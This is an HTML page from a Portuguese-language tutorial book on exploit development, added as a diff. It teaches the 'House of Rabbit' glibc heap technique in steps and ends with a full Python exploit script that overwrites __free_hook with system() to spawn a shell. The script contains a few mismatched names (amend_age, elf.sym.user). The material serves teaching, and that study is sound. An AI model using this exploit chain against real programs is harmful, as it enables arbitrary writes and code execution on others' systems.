@@ -1,0 +1,395 @@
+<!DOCTYPE HTML>
+<html lang="pt-br" class="sidebar-visible no-js ayu">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>House of Rabbit - Um Livrinho Sobre Exploit Dev</title>
+        <!-- Custom HTML head -->
+        
+
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff" />
+
+        <link rel="icon" href="../../favicon.svg">
+        <link rel="shortcut icon" href="../../favicon.png">
+        <link rel="stylesheet" href="../../css/variables.css">
+        <link rel="stylesheet" href="../../css/general.css">
+        <link rel="stylesheet" href="../../css/chrome.css">
+        <link rel="stylesheet" href="../../css/print.css" media="print">
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../fonts/fonts.css">
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../highlight.css">
+        <link rel="stylesheet" href="../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+    </head>
+    <body>
+        <!-- Provide site root to javascript -->
+        <script type="text/javascript">
+            var path_to_root = "../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "ayu";
+        </script>
+
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script type="text/javascript">
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script type="text/javascript">
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            var html = document.querySelector('html');
+            html.classList.remove('no-js')
+            html.classList.remove('ayu')
+            html.classList.add(theme);
+            html.classList.add('js');
+        </script>
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script type="text/javascript">
+            var html = document.querySelector('html');
+            var sidebar = 'hidden';
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            }
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <div class="sidebar-scrollbox">
+                <ol class="chapter"><li class="chapter-item affix "><a href="../../mapa.html">Mapa</a></li><li class="spacer"></li><li class="chapter-item "><a href="../../stack/stack.html">Stack</a></li><li class="chapter-item "><a href="../../stack/phoenix/setup.html">Phoenix Stack</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/phoenix/StackZero.html">Stack Zero</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackOne.html">Stack One</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackTwo.html">Stack Two</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackThree.html">Stack Three</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackFour.html">Stack Four</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackFive.html">Stack Five</a></li><li class="chapter-item "><a href="../../stack/phoenix/StackSix.html">Stack Six</a></li></ol></li><li class="chapter-item "><a href="../../stack/mitigacoes.html">Mitigações</a></li><li class="chapter-item "><a href="../../stack/ret2libc.html">Ret2LibC</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>Protostar Stack Six</div></li><li class="chapter-item "><div>Avançado: Múltiplos ret2libc</div></li></ol></li><li class="chapter-item "><a href="../../stack/gotplt.html">GOT e PLT</a></li><li class="chapter-item "><a href="../../stack/rop/intro.html">ROP</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/primitivos.html">Primitivos</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/ROPE/dump.html">ROPE</a></li></ol></li><li class="chapter-item "><div>Pivot</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/rop/ROPE/pivot.html">ROPE: pivot</a></li></ol></li><li class="chapter-item "><a href="../../stack/rop/SROP/SROP.html">SROP</a></li><li class="chapter-item "><a href="../../stack/rop/ret2dlresolve.html">ret2dl-resolve</a></li></ol></li><li class="chapter-item "><a href="../../stack/ASLR/aslr.html">ASLR</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../stack/ASLR/corromperGOT.html">Corromper GOT</a></li><li class="chapter-item "><a href="../../stack/ASLR/ret2plt.html">ret2plt</a></li><li class="chapter-item "><a href="../../stack/ASLR/brute32.html">Bruteforce</a></li></ol></li><li class="chapter-item "><div>Canary</div></li><li class="chapter-item "><div>PIE</div></li><li class="chapter-item "><a href="../../stack/leakAll.html">Extra: Leakando tudo</a></li><li class="spacer"></li><li class="chapter-item "><a href="../../heap/heap.html">Heap</a></li><li class="chapter-item "><a href="../../heap/intro.html">Intro</a></li><li class="chapter-item "><div>Bugs Gerais</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><div>UAF</div><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/geral/uaf/heap-two.html">Exploit Education: Heap Two</a></li></ol></li></ol></li><li class="chapter-item "><a href="../../heap/relacionados/relacionados.html">Conceitos Relacionados</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/relacionados/io_list_all.html">_IO_list_all</a></li></ol></li><li class="chapter-item expanded "><a href="../../heap/malloc/intro.html">Atacando Malloc</a><a class="toggle"><div>❱</div></a></li><li><ol class="section"><li class="chapter-item "><a href="../../heap/malloc/teoria.html">Teoria</a></li><li class="chapter-item "><a href="../../heap/malloc/fastbinsDup.html">Fastbins Dup</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfForce.html">House of Force</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfSpirit.html">House of Spirit</a></li><li class="chapter-item "><a href="../../heap/malloc/unsafeUnlink.html">Unsafe Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/safeUnlink.html">Safe Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfEinherjar.html">House of Einherjar</a></li><li class="chapter-item "><a href="../../heap/malloc/GooglePoisonNull.html">Google Poison Null Byte</a></li><li class="chapter-item "><a href="../../heap/malloc/PartialUnlink.html">Unsorted bins: Partial Unlink</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfOrange.html">House of Orange</a></li><li class="chapter-item "><a href="../../heap/malloc/comboFastUnsorted.html">Combo: Fast+Unsorted</a></li><li class="chapter-item "><a href="../../heap/malloc/HouseOfLore.html">House of Lore</a></li><li class="chapter-item "><div>House of Rust</div></li><li class="chapter-item expanded "><a href="../../heap/malloc/HouseOfRabbit.html" class="active">House of Rabbit</a></li><li class="chapter-item "><div>House of Corrosion</div></li></ol></li><li class="chapter-item "><div>Extra</div></li><li class="spacer"></li><li class="chapter-item "><a href="../../linux_internals/linux.html">Linux Internals</a></li><li class="chapter-item "><a href="../../linux_internals/prerequisitos.html">Prerequisitos</a></li></ol>
+            </div>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle"></div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky bordered">
+                    <div class="left-buttons">
+                        <button id="sidebar-toggle" class="icon-button" type="button" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </button>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu (default)</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Um Livrinho Sobre Exploit Dev</h1>
+
+                    <div class="right-buttons">
+                        <a href="../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+                        <a href="https://github.com/0xturazzi/Um-Livrinho-Sobre-Exploit-Dev/" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script type="text/javascript">
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="house-of-rabbit"><a class="header" href="#house-of-rabbit">House Of Rabbit</a></h1>
+<ul>
+<li><a href="#house-of-rabbit">House Of Rabbit</a></li>
+<li><a href="#teoria">Teoria</a></li>
+<li><a href="#ataque">Ataque</a>
+<ul>
+<li><a href="#fastbin-dup">Fastbin dup</a></li>
+<li><a href="#malloc_consolidate">malloc_consolidate()</a></li>
+<li><a href="#largebin">largebin</a>
+<ul>
+<li><a href="#aumentar-system_mem">Aumentar system_mem</a></li>
+</ul>
+</li>
+<li><a href="#write">Write</a></li>
+<li><a href="#exec">Exec</a></li>
+</ul>
+</li>
+<li><a href="#alternativas-para-linkar-o-chunk_fake-no-largebins">Alternativas para linkar o chunk_fake no largebins</a></li>
+<li><a href="#fontes-e-creditos">Fontes e creditos</a></li>
+</ul>
+<h1 id="teoria"><a class="header" href="#teoria">Teoria</a></h1>
+<p>A House of Rabbit busca nos dar um primitivo similar a House of 
+Force e a tecnica nao usa um heap leak. Ela é chamada assim, pois 
+o chunk fica pulando entre múltiplos bins como um coelhinho.</p>
+<p>Fast bin dup -&gt;</p>
+<p>O nosso objetivo com essa tecnica é dar um arbwrite em um endereço acima do 
+chunk falso.</p>
+<p>Nos iremos fazer isso por meio de um fake chunk de tamanho enorme, que da um 
+wrap around no va-space... Assim, o nosso write é relativo, nao precisando de<br />
+um heap leak, somente o endereço do chunk falso e o offset para o alvo!</p>
+<p>Porem como o fake e enorme, nos somente podemos aloca-lo a partir do unsorted 
+ou do largebin apropriado.</p>
+<p>Alem disso, o unsorted bin tem checks no size em relação a memoria max, assim 
+so sobrando o large bins para linkarmos o chunk falso! Visto que eles nao 
+possuem checks no size (o ultimo largebin <code>&gt;= 0x80000</code> (ate infinito))!</p>
+<p>Então, se alocarmos o nosso chunk falso no maior largebin (bin 126), podemos 
+forjar o size dele para fazermos mallocs de qualquer tamanho :D</p>
+<h1 id="ataque"><a class="header" href="#ataque">Ataque</a></h1>
+<p>Para poder mover o fake chunk de um bin para o outro, vamos precisar alterar 
+seus meta-dados múltiplas vezes....</p>
+<p>Para isso, vamos assumir que o <code>elf.sym.username</code> é armazenado no <code>.data</code> 
+proximo ao <code>alvo</code> (aonde queremos escrever), e nos podemos altera-lo quando 
+quisermos pela função <code>username()</code>! </p>
+<ul>
+<li>Fast bin dup -&gt; fake:fast </li>
+<li>malloc_consolidate() -&gt; fake:unsorted</li>
+<li>SORT -&gt; fake:large </li>
+<li>tamanho enorme -&gt; free -&gt;</li>
+</ul>
+<h2 id="fastbin-dup"><a class="header" href="#fastbin-dup">Fastbin dup</a></h2>
+<p>Nos vamos começar o ataque com um fastbin dup (de qualquer tamanho)</p>
+<pre><code class="language-py">### FASTBIN ###
+chunk_fake = elf.sym.username 
+username(p64(0x21))
+
+chunk_A = malloc(0x18)
+chunk_B = malloc(0x18)
+
+free(chunk_A)
+free(chunk_B)
+free(chunk_A)
+
+chunk_A = malloc(0x18)
+edit(chunk_A, p64(chunk_fake - 8) )
+</code></pre>
+<p>Assim, o chunk falso agora esta linkado no fastbin</p>
+<pre><code class="language-py">0x0000000000000000	0x0000000000000021 &lt;-- fastbins[0x20][1]
+    chunk_fake-8 	0x0000000000000000	
+0x0000000000000000	0x0000000000000021 &lt;-- fastbins[0x20][0]
+0x0000000000000000	0x0000000000000000	
+0x0000000000000000	0x0000000000020fc1 &lt;-- Top chunk
+ 
+fastbin 0x20: chunk_B —▸ chunk_A —▸ chunk_fake (username) ◂— 0x0
+                 
+</code></pre>
+<h2 id="malloc_consolidate"><a class="header" href="#malloc_consolidate">malloc_consolidate()</a></h2>
+<p><code>malloc_consolidate()</code> pega todos os fast chunks de uma arena e os coloca no 
+unsorted bin, assim, transferindo o nosso fake</p>
+<p>Nos poderíamos usar o método do malloc, mas o nosso chunk nao passa: 
+<code>fencepost &lt; chunk &lt;= system_mem</code> do search nos unsorted bins que viria em 
+seguida (workarounds la no teoria)</p>
+<p>Assim, vamos precisar usar o método do free1</p>
+<p>Durante o malloc_consolidate, o programa vai tentar consolidar o nosso 
+chunk_fake para frente</p>
+<p>Voce pode colocar fenceposts ou simplesmente alterar o size para <code>0x1</code> </p>
+<pre><code class="language-py">### FASTBIN ###
+...
+
+### UNSORTED ###
+username(1)
+chunk_C = malloc(0x88)
+free(chunk_C) # Consolidar chunk_C com o top chamou malloc_consolidate()
+              # sem alocar dos unsortedbins
+</code></pre>
+<pre><code class="language-py">HEAP
+0x0000000000000000	0x0000000000021001	 &lt;-- Top chunk
+
+chunk_fake
+0x0000000000000000	0x0000000000000001
+0x00007f1ed5d27b58	0x00007f1ed5d27b58
+0x0000000000000000	0x0000000000000000
+0x0000000000000000	0x0000000000000000
+
+pwndbg&gt; unsortedbin 
+all: chunk_fake —▸ 0x7f1ed5d27b58 (main_arena+88) ◂— chunk_fake
+</code></pre>
+<h2 id="largebin"><a class="header" href="#largebin">largebin</a></h2>
+<p>Agora, basta alterar o size do chunk_fake e <strong>SORT</strong> ele para o maior large bin</p>
+<pre><code class="language-py">### FASTBIN ###
+...
+
+### UNSORTED ###
+...
+
+### LARGEBIN ###
+username(0x80001)
+malloc(0x80008) # Algo maior, para o nosso chunk ser SORT e nao alocado 
+</code></pre>
+<p>Agora, o chunk_fake esta legitimamente no maior large bin (mantendo a 
+estabilidade da arena), e podendo ter tamanho infinito</p>
+<h3 id="aumentar-system_mem"><a class="header" href="#aumentar-system_mem">Aumentar system_mem</a></h3>
+<p>Caso nesse ponto o seu system_mem seja menor que 0x80000 o chunk nao passara o check de tamanho dos unsortedbins: &lt;= system_mem</p>
+<p>voce precisa no inicio do seu exploit (antes do fastbin dup) pegar um chunk 
+grande (chunk_X) para aumentar system_mem </p>
+<p>Porem, caso o chunk_X seja maior que mmap_threshold (voce pode 
+checar com <code>p mp_</code>) o chunk nao ira pro heap e nao mudara system_mem</p>
+<p>Caso voce queira aumentar a sua mmap_threshold basta dar free() nele,
+e em seguida aloca-lo de novo aumentando o system_mem</p>
+<pre><code class="language-py">### SYSTEM_MEM ###
+chunk_X = malloc(0x60000) # MMAP
+free(chunk_X)             # Elevar threshold
+chunk_X = malloc(0x60000) # Elevar system_mem
+
+### FASTBIN ###
+...
+### UNSORTED ###
+...
+### LARGEBIN ###
+...
+</code></pre>
+<h2 id="write"><a class="header" href="#write">Write</a></h2>
+<p>A partir desse momento, temos uma House of Force, inclusive utilizando a mesma 
+formula:</p>
+<pre><code class="language-py">def wrap(A,B):
+    return (0xffffffffffffffff - A)+B
+</code></pre>
+<p>Basta criar um chunk enorme que da uma volta no va-space</p>
+<p>Em seguida, poderemos dividir esse chunk e alocar a partir dele, e 
+diferentemente do top chunk, nao temos mitigações</p>
+<pre><code class="language-py">### WRITE ###
+username(0xfffffffffffffff1) # maior tamanho possível de chunk
+malloc(delta(fake_chunk, alvo-0x20))
+chunk_alvo = malloc(0x20)
+</code></pre>
+<h2 id="exec"><a class="header" href="#exec">Exec</a></h2>
+<p>Voce pode usar o write, assim como na house of force, para corromper os hooks</p>
+<p>por exemplo, o __free_hook com system() e chamar free() num chunk com /bin/sh</p>
+<p>eu vou reutilizar o do LARGEBINS</p>
+<p>Como o remainder nao vai consumir tanto, nos nao precisamos do maior tamanho 
+de chunk </p>
+<p>Assim, o nosso exploit inteiro fica:</p>
+<pre><code class="language-py">def wrap(A,B):
+    return (0xffffffffffffffff - A)+B
+
+### SYSTEM_MEM ###
+chunk_X = malloc(0x60000) # MMAP
+free(chunk_X)             # Elevar threshold
+chunk_X = malloc(0x60000) # Elevar system_mem
+
+### FASTBIN ###
+chunk_fake = elf.sym.username 
+username(p64(0x21))
+
+chunk_A = malloc(0x18)
+chunk_B = malloc(0x18)
+
+free(chunk_A)
+free(chunk_B)
+free(chunk_A)
+
+chunk_A = malloc(0x18)
+edit(chunk_A, p64(chunk_fake - 8) )
+
+### UNSORTED ###
+username(1)
+chunk_C = malloc(0x88)
+free(chunk_C) # Consolidar chunk_C com o top chamou malloc_consolidate()
+              # sem alocar dos unsortedbins
+
+### LARGEBIN ###
+amend_age(0x80001)
+chunk_SH = malloc(0x80008) # Algo maior, para o nosso chunk ser SORT e nao alocado
+edit(chunk_SH, &quot;/bin/sh\x00&quot;)
+
+### WRITE ###
+distancia = libc.sym.__free_hook-0x20 - elf.sym.user
+
+username(distancia + 0x29)
+
+malloc(distancia)
+malloc(0x18, flat(0, libc.sym.system)) # free_hook nao e alinhado 16bytes
+free(chunk_SH)
+</code></pre>
+<h1 id="alternativas-para-linkar-o-chunk_fake-no-largebins"><a class="header" href="#alternativas-para-linkar-o-chunk_fake-no-largebins">Alternativas para linkar o chunk_fake no largebins</a></h1>
+<p>Voce poderia dar um double free no large chunk (ou UAF) e modificar os 
+meta-dados apontando para o chunk falso estilo fastbin dup, porem voce 
+precisaria alterar o prev_size do chunk seguinte (mitigação dos chunks normais)</p>
+<p>Alem disso, poderíamos usar a House Of Lore para isso, porem corromperíamos o 
+unsorted bin, tornando o resto do exploit difícil!</p>
+<h1 id="fontes-e-creditos"><a class="header" href="#fontes-e-creditos">Fontes e creditos</a></h1>
+<ul>
+<li><a href="https://www.udemy.com/course/linux-heap-exploitation-part-2">Udemy: Max Kamper</a></li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="../../heap/malloc/HouseOfLore.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+                            <a rel="next" href="../../linux_internals/linux.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="../../heap/malloc/HouseOfLore.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+                    <a rel="next" href="../../linux_internals/linux.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <script type="text/javascript">
+            window.playground_copyable = true;
+        </script>
+        <script src="../../elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../mark.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../searcher.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../clipboard.min.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../highlight.js" type="text/javascript" charset="utf-8"></script>
+        <script src="../../book.js" type="text/javascript" charset="utf-8"></script>
+
+        <!-- Custom JS scripts -->
+    </body>
+</html>
